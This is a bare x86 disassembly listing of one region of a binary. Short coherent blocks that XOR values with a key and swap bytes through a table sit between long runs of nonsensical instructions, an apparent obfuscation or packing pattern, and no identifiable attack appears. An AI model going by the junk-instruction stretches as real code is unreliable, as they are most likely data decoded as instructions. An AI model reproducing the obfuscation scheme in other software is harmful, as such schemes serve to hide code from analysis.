  40445b:	and    al,0x4
  40445d:	dec    edi
  40445e:	mov    ah,0x5
  404460:	inc    edi
  404461:	xchg   ebx,eax
  404462:	mov    al,ds:0xea8a3288
  404467:	sbb    eax,0xe23f4003
  40446c:	mov    edx,0xf08fabad
  404471:	mov    bh,0xdd
  404473:	xor    ebp,ecx
  404475:	fnsave [esi+edi*8]
  404478:	imul   edx,ecx,0x5
  40447b:	cmp    dh,ah
  40447d:	inc    edi
  40447e:	push   ss
  40447f:	add    dh,BYTE PTR [ebx-0x58011b98]
  404485:	jmp    0xcebf:0xd65363e1
  40448c:	xor    eax,DWORD PTR [ebx]
  40448e:	mov    ebx,DWORD PTR [ebp-0x10]
  404491:	jmp    0x4045f6
  404496:	psraw  mm6,0x10
  40449a:	out    0xfb,al
  40449c:	frstor ds:0xaa51ed7e
  4044a2:	fcomp  QWORD PTR [ebp+0x1f7e5fa7]
  4044a8:	jl     0x404526
  4044aa:	xor    al,0x7f
  4044ac:	jl     0x40452a
  4044ae:	ins    DWORD PTR es:[edi],dx
  4044af:	add    eax,0xb8e2686c
  4044b4:	mov    ah,0xcd
  4044b6:	(bad)  
  4044b8:	ret    
  4044b9:	cmp    eax,ebp
  4044bb:	repz pop edi
  4044bd:	rcl    dl,0xeb
  4044c0:	clc    
  4044c1:	pop    ebx
  4044c2:	cld    
  4044c3:	sub    al,0x11
  4044c5:	and    dh,BYTE PTR [eax+esi*8]
  4044c8:	cmp    DWORD PTR [ecx],ebp
  4044ca:	mov    ds:0xf92e9db,eax
  4044cf:	mov    al,0x9f
  4044d1:	jo     0x4044ae
  4044d3:	jge    0x40452c
  4044d5:	pusha  
  4044d6:	push   ds
  4044d7:	rcr    DWORD PTR ds:[ebx],cl
  4044da:	test   BYTE PTR [ecx+0x0],0xf3
  4044de:	pop    eax
  4044df:	mov    esi,0xbc728da2
  4044e4:	lahf   
  4044e5:	pop    ss
  4044e6:	adc    al,0xb5
  4044e8:	xchg   BYTE PTR [ebx],bh
  4044ea:	push   0xffffff89
  4044ec:	cmp    eax,0x5264d600
  4044f1:	mov    esi,0x60d95740
  4044f6:	(bad)  [ecx]
  4044f8:	retf   
  4044f9:	and    ebp,edi
  4044fb:	test   DWORD PTR ds:0x8f9ed79f,eax
  404501:	pusha  
  404502:	jmp    0x404493
  404504:	lock aad 0x44
  404507:	inc    esi
  404508:	xchg   esp,eax
  404509:	repnz pop esi
  40450b:	shr    BYTE PTR [esi],1
  40450d:	sub    esi,eax
  40450f:	pop    ecx
  404510:	out    0x40,al
  404512:	lods   eax,DWORD PTR ds:[esi]
  404513:	pushf  
  404514:	test   BYTE PTR [ebp-0x3304472f],dl
  40451a:	popa   
  40451b:	stos   DWORD PTR es:[edi],eax
  40451c:	int3   
  40451d:	dec    edx
  40451e:	push   0x42
  404520:	fistp  QWORD PTR [ebx]
  404522:	pop    esi
  404523:	ds call 0xd2e7:0x54ed5b43
  40452b:	cmp    edi,DWORD PTR [eax-0x6a]
  40452e:	pop    edx
  40452f:	push   es
  404530:	adc    DWORD PTR [eax-0x80],ebx
  404533:	cmp    esi,DWORD PTR [ebp+0x2f]
  404536:	xchg   esi,esp
  404538:	popf   
  404539:	int3   
  40453a:	in     al,0xa9
  40453c:	xor    eax,0xc9665eb9
  404541:	lock xchg edx,eax
  404543:	mov    al,ds:0x87edc1a1
  404548:	or     al,0x2f
  40454a:	xor    ch,dl
  40454c:	sub    DWORD PTR [edi],0x51b5069d
  404552:	sahf   
  404553:	xor    ah,BYTE PTR [edx]
  404555:	dec    esi
  404556:	in     al,dx
  404557:	imul   ebp,edi,0xffffffaf
  40455a:	es xchg sp,ax
  40455d:	jmp    0x4044eb
  40455f:	inc    esi
  404560:	sbb    eax,0xd0c2c7e9
  404565:	mov    ecx,0xaf658c8b
  40456a:	cwde   
  40456b:	idiv   DWORD PTR [edx-0x7606d34f]
  404571:	and    bl,BYTE PTR [eax]
  404573:	(bad)  
  404575:	outs   dx,BYTE PTR ds:[esi]
  404576:	jle    0x404584
  404578:	imul   esp,DWORD PTR [edi],0x37611320
  40457e:	mov    ds:0xcc14e11e,eax
  404583:	adc    esi,DWORD PTR [edi+eiz*8-0xcad8d07]
  40458a:	push   ds
  40458b:	jg     0x40453f
  40458d:	out    dx,eax
  40458e:	dec    esi
  40458f:	jg     0x404531
  404591:	add    al,0xdf
  404593:	xor    eax,DWORD PTR [ebp+0xa]
  404596:	jl     0x4045f2
  404598:	out    0x19,eax
  40459a:	xchg   esi,eax
  40459b:	push   edi
  40459c:	fbstp  TBYTE PTR [edx]
  40459e:	dec    ebp
  40459f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a0:	imul   di,di,0x274f
  4045a5:	or     BYTE PTR [edx+0x23],dh
  4045a8:	sub    bh,BYTE PTR ds:0x9884f13
  4045ae:	mov    ebp,0x682206b6
  4045b3:	das    
  4045b4:	mov    esp,0x80171bc7
  4045b9:	cld    
  4045ba:	ficom  WORD PTR [eiz*1+0x76a5f722]
  4045c1:	repz gs retf 
  4045c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045c5:	cmp    al,BYTE PTR [ecx-0xa]
  4045c8:	push   ecx
  4045c9:	bound  esp,QWORD PTR [edx+0x5f]
  4045cc:	(bad)
  4045d0:	xchg   ecx,edi
  4045d2:	cdq    
  4045d3:	or     al,0x46
  4045d5:	push   ecx
  4045d6:	sub    DWORD PTR [ebx+0x70],ebx
  4045d9:	inc    edx
  4045da:	and    BYTE PTR [edi],0x32
  4045dd:	ins    BYTE PTR es:[edi],dx
  4045de:	pop    edi
  4045df:	add    ebx,0xffffffdc
  4045e2:	fmul   DWORD PTR [esi]
  4045e4:	repnz mov ds:0x53a781f5,al
  4045ea:	int3   
  4045eb:	cs (bad) 
  4045ed:	push   ss
  4045ee:	and    ah,bl
  4045f0:	sub    eax,0x446ad5d5
  4045f5:	push   ebp
  4045f6:	sub    ebx,edi
  4045f8:	cmp    ebx,edx
  4045fa:	ja     0x404608
  404600:	mov    edx,DWORD PTR [ebp-0x34]
  404603:	jmp    0x40462f
  404608:	mov    edx,DWORD PTR [ebp-0x3c]
  40460b:	mov    edi,DWORD PTR [ebp-0x4]
  40460e:	xor    edx,eax
  404610:	xor    edi,eax
  404612:	add    edx,ecx
  404614:	add    edi,ecx
  404616:	imul   edx,edi
  404619:	mov    edi,DWORD PTR [ebp-0x8]
  40461c:	mov    ebx,DWORD PTR [ebp-0x10]
  40461f:	sub    ebx,edi
  404621:	cmp    ebx,edx
  404623:	mov    edx,DWORD PTR [ebp-0x38]
  404626:	jbe    0x40462f
  40462c:	mov    edx,DWORD PTR [ebp-0x3c]
  40462f:	mov    edi,DWORD PTR [ebp-0x4]
  404632:	xor    edi,eax
  404634:	xor    edx,eax
  404636:	add    edi,ecx
  404638:	add    edx,ecx
  40463a:	jmp    0x40479f
  40463f:	mov    WORD PTR [ecx+esi*8+0x3f],es
  404643:	dec    ecx
  404644:	(bad)  [esi+0x47]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	call   0x8f95:0xa25b2d5
  40464f:	ss push ds
  404651:	jl     0x4046cf
  404653:	xor    al,0x7f
  404655:	jl     0x4046d3
  404657:	xor    al,0xe6
  404659:	adc    BYTE PTR es:[ecx],bh
  40465c:	test   al,0xae
  40465e:	xor    eax,0x5da2d49c
  404663:	jge    0x40462d
  404665:	jmp    0xc67:0xda59ef4c
  40466c:	cli    
  40466d:	outs   dx,DWORD PTR ds:[esi]
  40466e:	outs   dx,DWORD PTR ds:[esi]
  40466f:	inc    esi
  404670:	dec    edi
  404671:	jp     0x404651
  404673:	call   0x141c419d
  404678:	inc    edi
  404679:	or     BYTE PTR [eax],bh
  40467b:	ror    DWORD PTR [edx-0xf3e308],0xd0
  404682:	or     edi,DWORD PTR [edx]
  404684:	or     al,0x7
  404686:	dec    esi
  404687:	xchg   ebp,eax
  404688:	repnz pop ebp
  40468a:	(bad)  
  40468b:	shl    dl,cl
  40468d:	pop    edx
  40468e:	inc    ebp
  40468f:	mov    dl,BYTE PTR [esi-0xb]
  404692:	sub    esi,DWORD PTR [ebp+0x6d]
  404695:	dec    ecx
  404696:	mov    ch,0x6b
  404698:	les    ebx,FWORD PTR [edi-0x47]
  40469b:	push   ebp
  40469c:	pop    esi
  40469d:	vandnps xmm7,xmm7,XMMWORD PTR [esi-0x72441c4c]
  4046a5:	push   cs
  4046a6:	lea    eax,[edi-0x9e2aef0]
  4046ac:	out    0xc,eax
  4046ae:	inc    eax
  4046af:	jnp    0x40464f
  4046b1:	pop    edi
  4046b2:	cmp    DWORD PTR [eax+ebx*2],0x78eae1eb
  4046b9:	mov    eax,ds:0x2b1c9480
  4046be:	in     eax,0x16
  4046c0:	pop    eax
  4046c1:	fidivr DWORD PTR [ecx-0x45847818]
  4046c7:	in     al,dx
  4046c8:	cli    
  4046c9:	add    ah,BYTE PTR [edx]
  4046cb:	xchg   edi,eax
  4046cc:	jae    0x4046c0
  4046ce:	and    DWORD PTR [edx-0x3],esp
  4046d1:	or     eax,0xb4a8756
  4046d6:	int    0xd8
  4046d8:	ins    BYTE PTR es:[edi],dx
  4046d9:	push   ebx
  4046da:	cmc    
  4046db:	std    
  4046dc:	aad    0x80
  4046de:	sahf   
  4046df:	rol    cl,cl
  4046e1:	data16 ja 0x4046c7
  4046e4:	stos   BYTE PTR es:[edi],al
  4046e5:	inc    esi
  4046e6:	mov    al,ds:0xc9547de2
  4046eb:	(bad)  
  4046ec:	addr16 int3 
  4046ee:	mov    DWORD PTR [ecx],esp
  4046f0:	jns    0x40470a
  4046f2:	or     DWORD PTR ss:[ebx+0x60],ebp
  4046f6:	lods   eax,DWORD PTR ds:[esi]
  4046f7:	outs   dx,DWORD PTR ds:[esi]
  4046f8:	je     0x404696
  4046fa:	(bad)  
  4046fb:	xor    al,ch
  4046fd:	jns    0x404747
  4046ff:	lea    edx,[ecx]
  404701:	cmp    ebp,DWORD PTR [ebx-0x1d]
  404704:	inc    ebx
  404705:	xor    dl,ah
  404707:	cmp    bl,BYTE PTR [ebx+0x3e]
  40470a:	jmp    0x404776
  40470c:	xor    al,0x49
  40470e:	mov    bp,0xa6b1
  404712:	jo     0x40472a
  404714:	dec    eax
  404715:	sub    DWORD PTR [ecx-0x21c0a738],ebp
  40471b:	cli    
  40471c:	xor    BYTE PTR [edi+0xe02ebdc],0x1
  404723:	out    0xd0,al
  404725:	xor    bh,BYTE PTR [ebx]
  404727:	repnz sub DWORD PTR [ebp-0x7b],0x47d014cd
  40472f:	pop    es
  404730:	push   0x68
  404732:	mov    bh,0x3
  404734:	mov    ebp,0x1cf8346d
  404739:	sub    BYTE PTR [ebp+0x37],dh
  40473c:	retf   0x49eb
  40473f:	adc    DWORD PTR [esi],0x41
  404742:	jae    0x4047ba
  404744:	pop    edi
  404745:	xlat   BYTE PTR ds:[ebx]
  404746:	shr    BYTE PTR ds:0x3ed4abfd,1
  40474c:	cs pushw ds
  40474f:	in     eax,dx
  404750:	stos   BYTE PTR es:[edi],al
  404751:	push   edx
  404752:	loopne 0x4046e6
  404754:	jge    0x404741
  404756:	adc    cl,BYTE PTR [eax]
  404758:	xor    eax,edx
  40475a:	retf   
  40475b:	out    0x7a,al
  40475d:	addr16 das 
  40475f:	pop    eax
  404760:	inc    ecx
  404761:	ins    DWORD PTR es:[edi],dx
  404762:	ss mov dh,0x95
  404765:	jnp    0x4047d6
  404767:	sub    eax,0xf21ffa39
  40476c:	cld    
  40476d:	dec    ebp
  40476e:	jbe    0x404707
  404770:	aam    0xa3
  404772:	pusha  
  404773:	sbb    ebp,DWORD PTR [ebp-0x6]
  404776:	adc    BYTE PTR [esi+0x31],0x75
  40477a:	sahf   
  40477b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477c:	shr    cl,cl
  40477e:	pop    ss
  40477f:	pop    ds
  404780:	inc    esp
  404781:	fdivr  QWORD PTR [edi+0x746086c]
  404787:	adc    esi,edi
  404789:	arpl   bx,si
  40478b:	(bad)  
  40478c:	hlt    
  40478d:	xchg   ecx,eax
  40478e:	jne    0x4047b1
  404790:	test   BYTE PTR [edi-0x39],al
  404793:	xchg   ebx,eax
  404794:	push   es
  404795:	(bad)  
  404796:	das    
  404797:	sti    
  404798:	ror    DWORD PTR [eax+0x366ae977],cl
  40479e:	cmp    al,0xf
  4047a0:	scas   eax,DWORD PTR es:[edi]
  4047a1:	xlat   BYTE PTR ds:[ebx]
  4047a2:	mov    DWORD PTR [ebp+0xc],edx
  4047a5:	mov    edx,DWORD PTR [ebp+0xc]
  4047a8:	mov    DWORD PTR [ebp-0x24],edx
  4047ab:	mov    edx,DWORD PTR [ebp-0x8]
  4047ae:	add    edx,DWORD PTR [ebp-0x40]
  4047b1:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  4047b8:	mov    DWORD PTR [ebp-0x1c],edx
  4047bb:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  4047c2:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4047c9:	mov    edx,DWORD PTR [ebp-0x18]
  4047cc:	xor    edx,eax
  4047ce:	add    edx,ecx
  4047d0:	jmp    0x404c6c
  4047d5:	mov    edx,DWORD PTR [ebp-0x18]
  4047d8:	xor    edx,eax
  4047da:	add    edx,DWORD PTR [ebp-0x14]
  4047dd:	mov    edi,DWORD PTR [ebp-0x1c]
  4047e0:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  4047e7:	mov    BYTE PTR [ebp+0xf],dl
  4047ea:	jmp    0x40494f
  4047ef:	int    0xf4
  4047f1:	mov    esi,0xfd66b566
  4047f6:	mov    ebx,0x8fce1da9
  4047fb:	fs jge 0x404868
  4047fe:	push   esp
  4047ff:	mov    ss,WORD PTR [ecx]
  404801:	jl     0x40487f
  404803:	xor    al,0x7f
  404805:	jl     0x404883
  404807:	add    eax,0xfa5c877b
  40480c:	rcl    BYTE PTR [esi-0x7c],cl
  40480f:	adc    BYTE PTR [ecx-0x5b],bl
  404812:	(bad)  [ecx+eiz*4+0x43]
  404816:	jbe    0x404858
  404818:	or     eax,0xe4aa7aed
  40481d:	(bad)
  404820:	mov    DWORD PTR [ecx],esp
  404822:	repnz fiadd WORD PTR [eax]
  404825:	ret    
  404826:	or     ch,bl
  404828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404829:	mov    fs,edi
  40482b:	jns    0x4047e3
  40482d:	inc    ecx
  40482e:	mov    cl,0xab
  404830:	mov    ds:0xfd2d6cb6,eax
  404835:	pusha  
  404836:	mov    WORD PTR [ebx],fs
  404838:	xchg   esp,eax
  404839:	(bad)  
  40483a:	push   ebp
  40483b:	dec    esp
  40483c:	and    BYTE PTR [esi-0x33ce823],ah
  404842:	adc    ebx,ecx
  404844:	cdq    
  404845:	push   ecx
  404846:	fimul  DWORD PTR [edi+0x59b04611]
  40484c:	cwde   
  40484d:	push   edi
  40484e:	sub    al,BYTE PTR [edi+0x47]
  404851:	cli    
  404852:	iret   
  404853:	into   
  404854:	(bad)  
  404855:	sbb    ebx,DWORD PTR ds:0x1caab769
  40485b:	adc    DWORD PTR [edi+0x2be33ad7],0xffffffc2
  404862:	imul   DWORD PTR [esi+0x2f]
  404865:	mov    bh,0x9f
  404867:	outs   dx,BYTE PTR cs:[esi]
  404869:	jno    0x4048d4
  40486b:	ds pusha 
  40486d:	adc    eax,0x2ce81408
  404872:	dec    eax
  404873:	in     eax,0x44
  404875:	xchg   DWORD PTR [ebp+edi*2+0x13],edi
  404879:	sub    eax,0x280acbfe
  40487e:	sub    BYTE PTR ds:0x71db41d5,al
  404884:	mov    ecx,0x1c26a216
  404889:	rep outs dx,BYTE PTR ds:[esi]
  40488b:	popa   
  40488c:	sub    BYTE PTR [ebx-0x28],dl
  40488f:	pop    esp
  404890:	or     eax,0x26c4e1f3
  404895:	jge    0x4048dc
  404897:	sub    eax,0xac655861
  40489c:	ins    BYTE PTR es:[edi],dx
  40489d:	fidivr DWORD PTR ds:0x88618c72
  4048a3:	adc    cl,BYTE PTR [esi+ebp*4-0x5e0d7217]
  4048aa:	mov    dh,0x3
  4048ac:	jge    0x40488e
  4048ae:	mov    eax,0x2c53ab6a
  4048b3:	inc    edx
  4048b4:	dec    eax
  4048b5:	add    dh,BYTE PTR [ebx]
  4048b7:	jge    0x4048bd
  4048b9:	dec    ebp
  4048ba:	cmp    BYTE PTR [ecx+0x12],bh
  4048bd:	mov    edx,0xe4ff6dc5
  4048c2:	mov    ecx,0x7e891c8f
  4048c7:	jo     0x4048be
  4048c9:	xor    esp,esi
  4048cb:	lahf   
  4048cc:	das    
  4048cd:	sar    ch,cl
  4048cf:	fisttp WORD PTR [ecx-0x9]
  4048d2:	jecxz  0x404879
  4048d4:	pop    edx
  4048d5:	mov    eax,0x63900c15
  4048da:	pop    edx
  4048db:	fcomp  DWORD PTR [edx]
  4048dd:	sub    esp,DWORD PTR [ebp+0x45]
  4048e0:	or     ebx,0x46
  4048e3:	inc    ebp
  4048e4:	int    0xef
  4048e6:	std    
  4048e7:	mov    ah,0x8f
  4048e9:	dec    esi
  4048ea:	dec    eax
  4048eb:	sbb    ecx,DWORD PTR [esi-0x1eb125fc]
  4048f1:	xchg   BYTE PTR [edi],bl
  4048f3:	into   
  4048f4:	jl     0x4048b7
  4048f6:	sar    BYTE PTR [esi+0x67],0x99
  4048fa:	adc    esp,esp
  4048fc:	outs   dx,DWORD PTR ds:[esi]
  4048fd:	aaa    
  4048fe:	cmp    dl,BYTE PTR [edx+esi*4]
  404901:	bound  ecx,QWORD PTR [ebp-0x7b]
  404904:	sahf   
  404905:	popf   
  404906:	inc    esi
  404907:	and    DWORD PTR [edx],edi
  404909:	dec    edx
  40490a:	test   al,0xe9
  40490c:	(bad)  
  40490e:	mov    eax,edx
  404910:	cmp    ebp,DWORD PTR [eax-0x3f55b1d8]
  404916:	jg     0x404924
  404918:	lock inc esi
  40491a:	mov    es,WORD PTR fs:[ecx-0x59]
  40491e:	out    dx,al
  40491f:	sub    dh,ah
  404921:	ins    BYTE PTR es:[edi],dx
  404922:	mov    BYTE PTR es:[edi+0x1a334ac1],dh
  404929:	mov    edx,0x1fde3ece
  40492e:	adc    BYTE PTR [eax+edx*4-0x5609570d],bl
  404935:	retf   0x101c
  404938:	jl     0x4048c5
  40493a:	aaa    
  40493b:	fsubr  DWORD PTR [esi+ebp*2-0x1777b9ac]
  404942:	cmp    dl,BYTE PTR [ebx+0x79cca69c]
  404948:	mov    esp,0x97608e03
  40494d:	inc    ebx
  40494e:	js     0x4048db
  404950:	push   ebp
  404951:	hlt    
  404952:	xor    edx,eax
  404954:	add    edx,DWORD PTR [ebp-0x14]
  404957:	mov    edi,DWORD PTR [ebp-0x1c]
  40495a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  404961:	mov    BYTE PTR [ebp+0xb],dl
  404964:	mov    dl,BYTE PTR [ebp+0xf]
  404967:	mov    edi,DWORD PTR [ebp-0xc]
  40496a:	xor    edi,eax
  40496c:	add    edi,DWORD PTR [ebp-0x14]
  40496f:	mov    ebx,DWORD PTR [ebp-0x1c]
  404972:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404979:	jmp    0x404ade
  40497e:	adc    ebx,DWORD PTR cs:[ecx]
  404981:	iret   
  404982:	sbb    eax,0xb1d5e6fd
  404987:	and    edi,DWORD PTR ss:[ebx+0x73373024]
  40498e:	inc    esi
  40498f:	adc    BYTE PTR [esp+edi*2+0x34],bh
  404993:	jg     0x404a11
  404995:	jl     0x404925
  404997:	call   0xa37b:0xa367bd29
  40499e:	jecxz  0x404947
  4049a0:	into   
  4049a1:	or     BYTE PTR [edi-0x71f85fbc],bl
  4049a7:	int    0x8b
  4049a9:	push   ebp
  4049aa:	(bad)  
  4049ab:	in     eax,0x5f
  4049ad:	scas   eax,DWORD PTR es:[edi]
  4049ae:	je     0x404a28
  4049b0:	xor    ax,0xc46e
  4049b4:	mov    eax,edx
  4049b6:	aas    
  4049b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049b8:	loop   0x404a08
  4049ba:	pop    edx
  4049bb:	pop    esp
  4049bc:	scas   al,BYTE PTR es:[edi]
  4049bd:	ins    DWORD PTR es:[edi],dx
  4049be:	add    eax,eax
  4049c0:	xor    eax,0xa886ade4
  4049c5:	repz sbb DWORD PTR [edi-0x6b],ebx
  4049c9:	mov    dl,BYTE PTR ss:[esi+0x5]
  4049cd:	and    al,0x44
  4049cf:	(bad)  
  4049d0:	xchg   ebx,eax
  4049d1:	(bad)  
  4049d2:	and    esp,ecx
  4049d4:	pop    esi
  4049d5:	mov    edi,0xaaabc606
  4049da:	sbb    eax,0xa2211e85
  4049df:	mov    ch,0x75
  4049e1:	test   BYTE PTR [ebp-0x1d],0x2d
  4049e5:	in     eax,dx
  4049e6:	nop
  4049e7:	gs ins BYTE PTR es:[edi],dx
  4049e9:	sub    DWORD PTR [edi-0x30d52782],0x5a9e1d2a
  4049f3:	mov    ds:0x48917b51,eax
  4049f8:	push   edi
  4049f9:	jecxz  0x404980
  4049fb:	mov    ah,ah
  4049fd:	sub    al,0xc7
  4049ff:	test   DWORD PTR [edi+0x32],esi
  404a02:	aaa    
  404a03:	dec    esp
  404a04:	jne    0x404a4e
  404a06:	retf   0x230a
  404a09:	pop    eax
  404a0a:	pop    ss
  404a0b:	gs xor al,0x65
  404a0e:	into   
  404a0f:	ror    ah,cl
  404a11:	sbb    BYTE PTR [eax+0x3d4a40f0],bl
  404a17:	mov    edi,0xecc289fd
  404a1c:	fs pusha 
  404a1e:	ror    bl,0x98
  404a21:	dec    ecx
  404a22:	mov    ebx,0x427d9443
  404a27:	sbb    bl,ah
  404a29:	outs   dx,BYTE PTR ds:[esi]
  404a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a2b:	or     eax,0x42ff5693
  404a30:	lods   al,BYTE PTR ds:[esi]
  404a31:	mov    BYTE PTR ds:0xb512105c,bh
  404a37:	dec    edx
  404a38:	pushf  
  404a39:	shr    DWORD PTR [ebx-0x23de4cd5],0xef
  404a40:	(bad)  
  404a42:	add    DWORD PTR [eax],edx
  404a44:	fwait
  404a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a46:	popf   
  404a47:	xor    DWORD PTR [ebp-0x7f],eax
  404a4a:	stos   DWORD PTR es:[edi],eax
  404a4b:	ret    
  404a4c:	fs sbb al,0x2e
  404a4f:	into   
  404a50:	jae    0x404a04
  404a52:	clc    
  404a53:	mov    al,ds:0x3475be5a
  404a58:	push   cs
  404a59:	jp     0x404a0b
  404a5b:	push   esp
  404a5c:	mov    bh,0x97
  404a5e:	push   edi
  404a5f:	mov    ebp,0x9c3aa740
  404a64:	xlat   BYTE PTR ds:[ebx]
  404a65:	loop   0x404a5b
  404a67:	bound  edx,QWORD PTR [esi+0x1c]
  404a6a:	lods   al,BYTE PTR ds:[esi]
  404a6b:	mov    ?,ebx
  404a6d:	cdq    
  404a6e:	scas   eax,DWORD PTR es:[edi]
  404a6f:	push   DWORD PTR [eax-0x2]
  404a72:	push   esi
  404a73:	and    BYTE PTR [ecx+0x35],0x7b
  404a77:	sub    DWORD PTR [edx+ebp*2],edx
  404a7a:	repz cwde 
  404a7c:	cli    
  404a7d:	pop    edi
  404a7e:	loope  0x404ae7
  404a80:	inc    edx
  404a81:	repz lahf 
  404a83:	int3   
  404a84:	add    eax,0x6da6c8e0
  404a89:	add    BYTE PTR [esi+0x33],dl
  404a8c:	cld    
  404a8d:	push   cs
  404a8e:	jg     0x404a90
  404a90:	pop    eax
  404a91:	js     0x404b0d
  404a93:	adc    DWORD PTR [ebx-0x6f],0x5f268b70
  404a9a:	pop    edi
  404a9b:	popf   
  404a9c:	push   esi
  404a9d:	adc    dl,al
  404a9f:	push   0x45
  404aa1:	push   ss
  404aa2:	in     al,dx
  404aa3:	out    dx,eax
  404aa4:	scas   eax,DWORD PTR es:[edi]
  404aa5:	mov    cl,0x34
  404aa7:	(bad)  
  404aa9:	test   BYTE PTR [edi],cl
  404aab:	jecxz  0x404af1
  404aad:	sub    BYTE PTR [eax+0x5faa1f91],cl
  404ab3:	xor    eax,0x1701ba23
  404ab8:	ja     0x404a9e
  404aba:	das    
  404abb:	mov    ch,0xd9
  404abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404abe:	call   0xaafaded
  404ac3:	jnp    0x404af7
  404ac5:	push   ecx
  404ac6:	and    esp,DWORD PTR [ecx-0x2d]
  404ac9:	retf   
  404aca:	sub    BYTE PTR [eax-0x1d],cl
  404acd:	mov    ebx,0xbc76aedf
  404ad2:	xor    DWORD PTR [eax],edx
  404ad4:	push   edi
  404ad5:	ret    
  404ad6:	js     0x404b0b
  404ad8:	jnp    0x404a80
  404ada:	adc    al,0xbf
  404adc:	mov    ebx,0xb558af2
  404ae1:	mov    edi,DWORD PTR [ebp-0x18]
  404ae4:	xor    edi,eax
  404ae6:	add    edi,DWORD PTR [ebp-0x14]
  404ae9:	mov    ebx,DWORD PTR [ebp-0x1c]
  404aec:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404af3:	mov    edx,DWORD PTR [ebp-0x44]
  404af6:	mov    edi,DWORD PTR [ebp-0xc]
  404af9:	xor    edx,eax
  404afb:	xor    edi,eax
  404afd:	add    edx,ecx
  404aff:	add    edi,ecx
  404b01:	imul   edx,edi
  404b04:	add    edx,DWORD PTR [ebp-0x14]
  404b07:	jmp    0x404c6c
  404b0c:	stos   DWORD PTR es:[edi],eax
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	cmp    al,0x3d
  404b10:	fnstsw WORD PTR [ebp+0x313d6e7d]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	sbb    eax,0xc1ad9dd3
  404b1c:	push   ds
  404b1d:	adc    bh,BYTE PTR [esp+edi*2+0x34]
  404b21:	jg     0x404b9f
  404b23:	jl     0x404b57
  404b25:	add    eax,0x16bf7470
  404b2a:	nop
  404b2b:	push   ds
  404b2c:	jno    0x404b27
  404b2e:	mov    BYTE PTR [ecx+0x9],al
  404b31:	xchg   edi,eax
  404b32:	xchg   edx,eax
  404b33:	cmp    DWORD PTR [ecx+0x5677d6e0],ecx
  404b39:	repnz dec ebp
  404b3b:	shl    DWORD PTR [edi+0x4d],cl
  404b3e:	fsub   st,st(3)
  404b40:	dec    ebp
  404b41:	mov    eax,ds:0x7570316b
  404b46:	adc    dl,bl
  404b48:	jmp    ecx
  404b4a:	inc    edx
  404b4b:	les    edx,FWORD PTR [edx-0x3acba516]
  404b51:	es jns 0x404af4
  404b54:	xor    al,0x9e
  404b56:	lods   eax,DWORD PTR ds:[esi]
  404b57:	fwait
  404b58:	inc    esp
  404b59:	bound  esi,QWORD PTR [edx+ecx*4-0x2d]
  404b5d:	out    0x7c,al
  404b5f:	les    ebp,FWORD PTR [ebx+0x43]
  404b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b63:	lahf   
  404b64:	and    ch,BYTE PTR [ecx+0x7a90cacf]
  404b6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b6b:	sbb    ah,dh
  404b6d:	mov    ebx,0xd50818bf
  404b72:	mov    dl,0xaa
  404b74:	out    dx,al
  404b75:	dec    ebp
  404b76:	call   0x65509b22
  404b7b:	mov    ds:0x1a4e64ad,al
  404b80:	push   cs
  404b81:	aas    
  404b82:	mov    ?,WORD PTR [edx-0x78ff1058]
  404b88:	jae    0x404b6e
  404b8a:	or     eax,0x233ffed2
  404b8f:	mov    ds:0xda6acd19,eax
  404b94:	or     BYTE PTR [eax-0x26c69cf1],bh
  404b9a:	and    al,0x21
  404b9c:	xor    DWORD PTR [eax-0x9],ebx
  404b9f:	scas   al,BYTE PTR es:[edi]
  404ba0:	cli    
  404ba1:	jecxz  0x404b63
  404ba3:	pop    esi
  404ba4:	ret    
  404ba5:	ins    DWORD PTR es:[edi],dx
  404ba6:	sbb    ch,BYTE PTR [ebp-0x2c3720a5]
  404bac:	sbb    edi,DWORD PTR [eax-0x20]
  404baf:	sbb    eax,0x5ed4141a
  404bb4:	adc    ebp,ebx
  404bb6:	ins    BYTE PTR es:[edi],dx
  404bb7:	imul   ebx,DWORD PTR [ebx],0xb601614f
  404bbd:	std    
  404bbe:	cmp    eax,0x1423d4e1
  404bc3:	rol    DWORD PTR [ebx+0x2b],0x6c
  404bc7:	test   DWORD PTR ds:0x27475f98,ecx
  404bcd:	xor    al,0x1a
  404bcf:	pop    edi
  404bd0:	mov    bl,BYTE PTR ds:0xd0f1f078
  404bd6:	dec    ebp
  404bd7:	xchg   ebp,eax
  404bd8:	jge    0x404ba2
  404bda:	adc    BYTE PTR ds:0x29670aec,ch
  404be0:	aas    
  404be1:	std    
  404be2:	mov    ds:0x25175bbd,eax
  404be7:	jmp    0x404b7f
  404be9:	into   
  404bea:	bound  ebp,QWORD PTR [edi+0x5]
  404bed:	fsubr  QWORD PTR [esp+ebp*8]
  404bf0:	adc    DWORD PTR [edx-0x21],edx
  404bf3:	hlt    
  404bf4:	pusha  
  404bf5:	stos   BYTE PTR es:[edi],al
  404bf6:	repz ret 
  404bf8:	sub    DWORD PTR [eax],0x54
  404bfb:	mov    ch,0x91
  404bfe:	jae    0x404b82
  404c00:	pop    ebp
  404c01:	and    ebp,DWORD PTR [edi]
  404c03:	ins    DWORD PTR es:[edi],dx
  404c04:	xchg   ebp,eax
  404c05:	mov    bh,BYTE PTR [ebx]
  404c07:	sbb    esi,DWORD PTR [ecx+ebp*1-0xc]
  404c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c0c:	jmp    0xb4f22aec
